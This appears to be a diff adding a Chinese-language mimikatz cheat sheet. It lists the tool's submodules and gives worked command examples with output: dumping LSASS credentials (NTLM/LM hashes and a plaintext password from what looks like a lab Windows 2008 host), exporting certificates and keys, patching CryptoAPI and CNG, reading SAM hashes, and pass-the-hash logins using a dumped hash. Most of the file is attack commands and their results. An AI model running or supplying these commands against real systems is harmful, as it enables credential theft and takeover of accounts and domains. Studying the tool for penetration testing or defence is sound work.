@@ -1,0 +1,430 @@
+https://book.hacktricks.xyz
+
+子模块:  
+standard    标准模块，基本命令
+crypto      加密相关模块
+sekurlsa    与证书相关的模块
+kerberos    kerberos模块
+privilege   提权相关模块
+process     进程相关模块
+serivce     服务相关模块
+lsadump     LsaDump模块
+ts          终端服务器模块
+event       事件模块
+misc        杂项模块
+token       令牌操作模块
+vault       Windows 、证书模块
+minesweeper    Mine Sweeper模块
+net         网络模块
+dpapi       DPAPI模块(通过API或RAW访问)[数据保护应用程序编程接口]
+busylight   BusyLight Module
+sysenv      系统环境值模块
+sid         安全标识符模块
+iis         IIS XML配置模块
+rpc         mimikatz的RPC控制
+sr98        用于SR98设备和T5577目标的RF模块
+rdm         RDM(830AL)器件的射频模块
+acr         ACR模块
+查看各个子模块的命令:
+mimikatz # process::help
+用法： 将process 换成 子模块
+
+#################################################################################
+
+privilege 模块命令:
+Privilege::debug      请求调试权限。
+Privilege::driver     请求装载驱动权限。
+Privilege::security   请求安全权限。
+Privilege::tcb        请求 tcb 权限。
+Privilege::backup     请求 backup 权限。
+Privilege::restore    请求恢复权限。
+Privilege::sysenv     请求系统环境权限。
+Privilege::id         请求 id 特权
+Privilege::name       请求指定名称的权限。
+
+privilege 使用示例:
+mimikatz # privilege::id 20  
+获取调试特权
+#Privilege '20' OK
+
+
+crypto 模块命令:
+providers     列出加密提供程序
+stores        列出加密存储
+certificates  列出(或导出)证书
+keys          列出(或导出)密钥容器
+sc            列出智能卡读卡器
+hash          使用可选用户名对密码进行哈希
+system        描述Windows系统证书(文件,TODO:注册表或配置单元)
+scauth        从CA创建身份验证证书(类似智能卡)
+certtohw      尝试将软件CA导出到加密(虚拟)硬件
+capi          实验-修补CryptoAPI层,便于导出
+cng           实验-修补cng服务,方便出口
+extract       实验-从CAPI RSA/AES提供程序提取密钥
+kutil         未知
+tpminfo       临时证书信息
+
+crypto 使用示例:
+mimikatz # crypto::providers  
+查看加密提供者
+# CryptoAPI providers :
+#  0. RSA_FULL      ( 1)   - Microsoft Base Cryptographic Provider v1.0
+#  1. DSS_DH        (13)   - Microsoft Base DSS and Diffie-Hellman Cryptographic Provider
+#  2. DSS           ( 3)   - Microsoft Base DSS Cryptographic Provider
+#  3. RSA_FULL      ( 1) H - Microsoft Base Smart Card Crypto Provider
+#  4. DH_SCHANNEL   (18)   - Microsoft DH SChannel Cryptographic Provider
+#  5. RSA_FULL      ( 1)   - Microsoft Enhanced Cryptographic Provider v1.0
+#  6. DSS_DH        (13)   - Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider
+#  7. RSA_AES       (24)   - Microsoft Enhanced RSA and AES Cryptographic Provider
+#  8. RSA_SCHANNEL  (12)   - Microsoft RSA SChannel Cryptographic Provider
+#  9. RSA_FULL      ( 1)   - Microsoft Strong Cryptographic Provider
+
+# CryptoAPI provider types:
+#  0. RSA_FULL      ( 1) - RSA Full (Signature and Key Exchange)
+#  1. DSS           ( 3) - DSS Signature
+#  2. RSA_SCHANNEL  (12) - RSA SChannel
+#  3. DSS_DH        (13) - DSS Signature with Diffie-Hellman Key Exchange
+#  4. DH_SCHANNEL   (18) - Diffie-Hellman SChannel
+#  5. RSA_AES       (24) - RSA Full and AES
+
+# CNG providers :
+#  0. Microsoft Primitive Provider
+#  1. Microsoft Smart Card Key Storage Provider
+#  2. Microsoft Software Key Storage Provider
+#  3. Microsoft SSL Protocol Provider
+
+mimikatz # crypto::stores   
+证书存储
+# Asking for System Store 'CURRENT_USER' (0x00010000)
+#  0. My
+#  1. Root
+#  2. Trust
+#  3. CA
+#  4. UserDS
+#  5. TrustedPublisher
+#  6. Disallowed
+#  7. AuthRoot
+#  8. TrustedPeople
+#  9. SmartCardRoot
+
+mimikatz # crypto::certificates   
+查看子存储有那些证书
+#  * System Store  : 'CURRENT_USER' (0x00010000)
+#  * Store         : 'My'
+
+mimikatz # crypto::certificates /store:Root   
+查看制定 Root
+#  * System Store  : 'CURRENT_USER' (0x00010000)
+#  * Store         : 'Root'
+
+#  0. Microsoft Root Certificate Authority
+#     Subject  : DC=com, DC=microsoft, CN=Microsoft Root Certificate Authority
+#     Issuer   : DC=com, DC=microsoft, CN=Microsoft Root Certificate Authority
+#     Serial   : 652e1307f458734cada5a04aa116ad79
+#     Algorithm: 1.2.840.113549.1.1.1 (RSA)
+#     Validity : 2001/5/10 7:19:22 -> 2021/5/10 7:28:13
+#     Hash SHA1: cdd4eeae6000ac7f40c3802c171e30148030c072
+
+mimikatz # crypto::certificates /store:Root /export   
+导出证书 默认在mimikatz当前目录
+公钥 DER格式
+私钥 PFX格式
+密码 mimikatz
+#  * System Store  : 'CURRENT_USER' (0x00010000)
+#  * Store         : 'Root'
+
+#  0. Microsoft Root Certificate Authority
+#     Subject  : DC=com, DC=microsoft, CN=Microsoft Root Certificate Authority
+#     Issuer   : DC=com, DC=microsoft, CN=Microsoft Root Certificate Authority
+#     Serial   : 652e1307f458734cada5a04aa116ad79
+#     Algorithm: 1.2.840.113549.1.1.1 (RSA)
+#     Validity : 2001/5/10 7:19:22 -> 2021/5/10 7:28:13
+#     Hash SHA1: cdd4eeae6000ac7f40c3802c171e30148030c072
+#         Public export  : OK - 'CURRENT_USER_Root_0_Microsoft Root Certificate Authority.der'
+
+mimikatz # crypto::capi   
+给CryptoAPI打补丁
+# Local CryptoAPI RSA CSP patched
+# Local CryptoAPI DSS CSP patched
+
+mimikatz # crypto::cng   
+打cng补丁
+# "KeyIso" service patched
+
+mimikatz # crypto::sc   
+列出智能卡读卡器
+# ERROR kuhl_m_crypto_l_sc ; SCardEstablishContext: 0x8010001d
+
+mimikatz # crypto::keys   
+读取密钥
+#  * Store         : 'user'
+#  * Provider      : 'MS_ENHANCED_PROV' ('Microsoft Enhanced Cryptographic Provider v1.0')
+#  * Provider type : 'PROV_RSA_FULL' (1)
+#  * CNG Provider  : 'Microsoft Software Key Storage Provider'
+
+# CryptoAPI keys :
+#     0. SYSTEM
+#     6d14e4b1d8ca773bab785d1be032546e_e7b734e1-32e6-45a6-b4aa-748ca3eae64d
+# ERROR kuhl_m_crypto_l_keys_capi ; CryptGetUserKey (0x8009000d)
+
+# CNG keys :
+
+
+sekurlsa 模块命令:
+           msv  -  获取 LM & NTLM 凭证，可以获取明文密码。
+       wdigest  -  获取 WDigest 凭证，可以获取明文密码
+      kerberos  -  获取 Kerberos 凭证。
+         tspkg  -  获取 TsPkg 凭证。
+       livessp  -  获取LiveSSP 凭证。
+           ssp  -  获取凭证。
+logonPasswords  -  获登录用户信息及密码，如果是在系统权限或者 psexec 进入的系统权限下，直接使用该命令，而无需运行 privilege::debug，否则需要运行该命令。
+       process  -  切换或者恢复到 lsass 初始状态。
+      minidump  -  切换或者恢复到 minidump 初始状态。
+           pth  -  Pass-the-hash
+        krbtgt  -  krbtgt!
+   dpapisystem  -  显示DPAPI_SYSTEM密码值。
+         trust  -  显示 Kerberos 票据。
+    backupkeys  -  首选备份主密钥
+       tickets  -  列出Kerberos票据
+         ekeys  -  显示 Kerberos 加密密钥。
+         dpapi  -  显示内存中的 MasterKeys
+       credman  -  显示管理员凭证。
+
+sekurlsa 使用示例:
+mimikatz # sekurlsa::msv
+获取 LM & NTLM 凭证，可以获取明文密码
+# Authentication Id : 0 ; 124466 (00000000:0001e632)
+# Session           : Interactive from 1
+# User Name         : win2008host
+# Domain            : WIN2008-USER
+# Logon Server      : WIN2008-USER
+# Logon Time        : 2023/7/31 21:10:39
+# SID               : S-1-5-21-4154266007-3477854183-4187878415-1000
+#         msv :
+#          [00000003] Primary
+#          * Username : win2008host
+#          * Domain   : WIN2008-USER
+#          * LM       : 60d5e6fa7b017ab9f76ccb47241e3d88
+#          * NTLM     : 14551ab0ef828ca80937a63a33952eaa
+#          * SHA1     : 960f4c179dd5401d054bb285cfc696b4248b97a0
+
+mimikatz # sekurlsa::wdigest
+通过可逆的方式去内存中读取明文密码
+# Authentication Id : 0 ; 123236 (00000000:0001e164)
+# Session           : Interactive from 1
+# User Name         : win2008host
+# Domain            : WIN2008-USER
+# Logon Server      : WIN2008-USER
+# Logon Time        : 2023/7/26 21:52:59
+# SID               : S-1-5-21-4154266007-3477854183-4187878415-1000
+#         wdigest :
+#          * Username : win2008host
+#          * Domain   : WIN2008-USER
+#          * Password : momoda1234
+
+mimikatz # sekurlsa::kerberos
+获取登录过此电脑的用户密码  (如果域管理员登录了这台电脑,就可以通过这个命令来获取域管理员的明文密码)
+# Authentication Id : 0 ; 123236 (00000000:0001e164)
+# Session           : Interactive from 1
+# User Name         : win2008host
+# Domain            : WIN2008-USER
+# Logon Server      : WIN2008-USER
+# Logon Time        : 2023/7/26 21:52:59
+# SID               : S-1-5-21-4154266007-3477854183-4187878415-1000
+#         kerberos :
+#          * Username : win2008host
+#          * Domain   : WIN2008-USER
+#          * Password : momoda1234
+
+# Authentication Id : 0 ; 996 (00000000:000003e4)
+# Session           : Service from 0
+# User Name         : WIN2008-USER$
+# Domain            : MOMODA
+# Logon Server      : (null)
+# Logon Time        : 2023/7/26 21:52:28
+# SID               : S-1-5-20
+#         kerberos :
+#          * Username : win2008-user$
+#          * Domain   : MOMODA.COM
+#          * Password : a5 dd e2 a8 64 25 7f ca 73 3f 6e 43 ad 9e 48 52 6f 1a b5 21 a4 f3 f7 07 68 fa 2d 91 34 02 1a 5a fc 14 71 44 6f 4f b3 4f e0 9e 8e 09 e4 b1 c7 1a 00 f6 d9 af 1d f1 0b ac 49 8d 49 45 75 ad 1d 51 b2 b6 53 e2 b8 bc 32 fb 34 f1 6c 76 52 ec ad a1 82 ae f1 e2 b2 63 f4 13 d1 18 55 a8 be 81 53 ec b1 50 1d ea 11 67 de ec 96 80 b3 be aa 88 5f e3 e4 54 20 de be ba 30 b1 ba 3e e0 6c 5f ca df 83 66 b4 5d 2d 44 83 aa 0e 25 ab 16 53 11 52 90 2b 7d 50 dd 8b 01 94 73 b5 37 86 f7 54 f2 31 5f dc 4a 58 32 34 9d fc 4f af b5 6b bf b4 ed a3 a8 91 7a 78 95 7f 12 03 b8 03 40 5b be 24 bb a4 92 82 3b cd aa 51 c3 3e ad ad 9a 92 c8 d6 2b d2 bb b0 37 15 b7 66 fd 46 8f f7 24 7c 6c 3d 8a da bc 51 87 51 3b c0 e2 56 2b 0e 02 e7 64 e5 50 a4 1f 01 
+
+mimikatz # sekurlsa::tspkg
+通过tspkg读取明文密码
+# Authentication Id : 0 ; 123236 (00000000:0001e164)
+# Session           : Interactive from 1
+# User Name         : win2008host
+# Domain            : WIN2008-USER
+# Logon Server      : WIN2008-USER
+# Logon Time        : 2023/7/26 21:52:59
+# SID               : S-1-5-21-4154266007-3477854183-4187878415-1000
+#         tspkg :
+#          * Username : win2008host
+#          * Domain   : WIN2008-USER
+#          * Password : momoda1234
+
+mimikatz # sekurlsa::livessp
+通过livessp 读取明文密码,貌似不行
+# Authentication Id : 0 ; 123236 (00000000:0001e164)
+# Session           : Interactive from 1
+# User Name         : win2008host
+# Domain            : WIN2008-USER
+# Logon Server      : WIN2008-USER
+# Logon Time        : 2023/7/26 21:52:59
+# SID               : S-1-5-21-4154266007-3477854183-4187878415-1000
+
+mimikatz # sekurlsa::ssp
+通过ssp 读取明文密码,貌似不行
+# Authentication Id : 0 ; 123236 (00000000:0001e164)
+# Session           : Interactive from 1
+# User Name         : win2008host
+# Domain            : WIN2008-USER
+# Logon Server      : WIN2008-USER
+# Logon Time        : 2023/7/26 21:52:59
+# SID               : S-1-5-21-4154266007-3477854183-4187878415-1000
+#         ssp :
+
+mimikatz # sekurlsa::logonPasswords
+通过以上各种方法,读取明文密码
+# Authentication Id : 0 ; 123236 (00000000:0001e164)
+# Session           : Interactive from 1
+# User Name         : win2008host
+# Domain            : WIN2008-USER
+# Logon Server      : WIN2008-USER
+# Logon Time        : 2023/7/26 21:52:59
+# SID               : S-1-5-21-4154266007-3477854183-4187878415-1000
+#         msv :
+#          [00000003] Primary
+#          * Username : win2008host
+#          * Domain   : WIN2008-USER
+#          * LM       : 60d5e6fa7b017ab9f76ccb47241e3d88
+#          * NTLM     : 14551ab0ef828ca80937a63a33952eaa
+#          * SHA1     : 960f4c179dd5401d054bb285cfc696b4248b97a0
+#         tspkg :
+#          * Username : win2008host
+#          * Domain   : WIN2008-USER
+#          * Password : momoda1234
+#         wdigest :
+#          * Username : win2008host
+#          * Domain   : WIN2008-USER
+#          * Password : momoda1234
+#         kerberos :
+#          * Username : win2008host
+#          * Domain   : WIN2008-USER
+#          * Password : momoda1234
+#         ssp :
+#         credman :
+
+mimikatz # sekurlsa::process
+将自己的进程切换到 lsass 进程中
+# Switch to PROCESS
+
+mimikatz # sekurlsa::minidump 文件名
+这个模块可以读取已经打包的内存信息
+需要之前已经将lsass进程的内存信息保存为dmp文件了  此时就可以离线读取其中的信息
+需要指定文件名
+#Switch to MINIDUMP : ERROR kuhl_m_sekurlsa_minidump ; <minidumpfile.dmp> argument is missing
+
+mimikatz # sekurlsa::pth
+#pass-the-hash
+#直接使用hash来进行登录
+sekurlsa::pth /user:administortra /domain:momoda /ntlm:14551ab0ef828ca80937a63a33952eaa
+
+sekurlsa::pth /user:administortra /domain:host1 /sha1:960f4c179dd5401d054bb285cfc696b4248b97a0
+#其中 /domain 如果加入了域,就填写域名,没有的话,就写计算机名
+#执行后会在本地新打开一个以hash身份的命令行窗口
+
+kerberos 模块命令:
+ptt     传递票据[NT 6]
+list    列出票据
+ask     请求TGS门票
+tgt     检索当前tgt
+purge   清除票据
+golden  伪造票据 如黄金票据
+hash    密钥的哈希密码
+ptc     传递ccache[NT6]
+clist   列出麻省理工学院/海姆达尔学院的证书
+
+process 模块命令:
+list    列表进程
+exports 列出导出
+imports 列出导入
+star    启动进程
+stop    终止进程
+suspend 挂起进程
+resume  恢复进程
+run     运行一个程序
+runp    以System 系统权限打开一个新的mimikatz窗口
+
+
+process 使用示例:
+mimikatz # process::list
+列出进程列表
+# 0       (null)
+# 4       System
+# 224     smss.exe
+# 304     csrss.exe
+# 336     wininit.exe
+# 352     csrss.exe
+# 392     winlogon.exe
+# 440     services.exe
+# 448     lsass.exe
+
+mimikatz # process::exports
+导出进程内存
+
+mimikatz # process::imports
+导入列表
+
+mimikatz # process::start
+开始一个进程
+
+mimikatz # process::stop
+停止一个进程
+
+mimikatz # process::suspend
+暂停一个进程
+
+mimikatz # process::resume
+恢复一个进程执行
+
+mimikatz # process::run notepad
+运行一个程序
+
+mimikatz # process::runp
+以System 系统权限打开一个新的mimikatz窗口
+
+
+lsadump:
+mimikatz # lsadump::sam
+通过查询SAM数据库来读取HASH
+# Domain : WIN2008-USER
+# SysKey : 3f914917a3312219fed00d8e3c4e6268
+# Local SID : S-1-5-21-4154266007-3477854183-4187878415
+
+# SAMKey : db168d8f87e1638e8d80625ec310aa0b
+
+# RID  : 000001f4 (500)
+# User : Administrator
+#   Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
+
+# RID  : 000001f5 (501)
+# User : Guest
+
+# RID  : 000003e8 (1000)
+# User : win2008host
+#   Hash NTLM: 14551ab0ef828ca80937a63a33952eaa
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
